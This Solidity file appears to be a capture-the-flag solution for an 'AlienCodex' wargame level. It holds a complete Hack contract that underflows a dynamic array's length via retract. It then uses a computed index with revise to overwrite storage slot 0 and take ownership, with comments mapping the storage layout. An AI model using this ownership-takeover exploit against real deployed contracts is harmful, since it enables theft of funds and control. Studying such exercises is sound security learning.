// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IAlienCodex {
    function retract() external;

    function make_contact() external;

    function revise(uint256 i, bytes32 _content) external;
}

//        make_contact false | owner address
// 0x000000000000000000000000|40055e69e7eb12620c8ccbccab1f187883301c30 slot 0
//                                          length of the array codex
// 0x0000000000000000000000000000000000000000000000000000000000000001 slot 1
// How I can get the element in the slot ? keccak256(slot) + index
contract Hack {
    IAlienCodex alien;

    constructor(address contractAddress) {
        alien = IAlienCodex(contractAddress);
        // We need pass the modifier
        alien.make_contact();
        //         Make contact true | owner address
        // 0x000000000000000000000001|40055e69e7eb12620c8ccbccab1f187883301c30 slot 0
    }

    function attack() public {
        alien.retract();
        // 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
        uint256 index = type(uint256).max - uint256(keccak256(abi.encode(uint256(1)))) + 1;

        // 0x000000000000000000000000<ADDRESS_SENDER>
        alien.revise(index, bytes32(uint256(uint160(msg.sender))));
    }
}
